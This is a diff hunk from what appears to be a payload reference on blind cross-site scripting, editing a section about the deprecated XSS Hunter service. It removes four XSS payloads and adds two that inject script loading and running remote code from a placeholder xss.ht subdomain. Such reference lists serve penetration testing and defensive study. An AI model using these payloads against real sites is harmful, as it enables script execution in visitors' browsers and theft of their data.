@@ -501,14 +501,9 @@ XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https:
 
 > XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
 
-```javascript
-"><script src=//yoursubdomain.xss.ht></script>
-
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')
-
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>
-
-<script>$.getScript("//yoursubdomain.xss.ht")</script>
+```xml
+"><script src=//<your.subdomain>.xss.ht></script>
+<script>$.getScript("//<your.subdomain>.xss.ht")</script>
 ```
 
 ### Other Blind XSS tools
